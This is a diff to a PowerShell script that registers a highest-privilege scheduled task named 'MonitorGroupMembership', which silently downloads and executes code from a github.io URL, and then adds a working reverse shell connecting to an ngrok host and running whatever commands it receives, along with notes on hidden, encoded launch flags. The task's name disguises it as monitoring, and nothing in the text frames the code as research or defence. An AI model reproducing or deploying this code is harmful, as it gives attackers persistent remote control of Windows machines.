@@ -12,3 +12,19 @@ $User= whoami # Specify the account to run the script
 $Action= New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoLogo -NonInteractive -ExecutionPolicy Bypass -windowstyle hidden -Command iex(iwr sl33pypanda.github.io/mi1stRepo/ps.txt -UseBasicParsing)" # Specify what program to run and with its parameters
 
 Register-ScheduledTask -TaskName "MonitorGroupMembership" -Trigger $Trigger -Action $Action -RunLevel Highest -Force
+
+
+-Nop  NoProfile 
+-sta 
+-w 1 
+-enc  Encode64
+ $client = New-Object System.Net.Sockets.TCPClient("2.tcp.ngrok.io",10428);
+ $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
+ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+ {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+ try {$sendback = (iex $data 2>&1 | Out-String );}
+ catch{$sendback = $sendback,"`n",$_.Exception.gettype().fullname ,"`n",$_.Exception.Message, "`n"}
+ $sendback2 = $sendback + $((pwd).PAtH) + "> ";
+ $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+ $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
+ $client.Close()
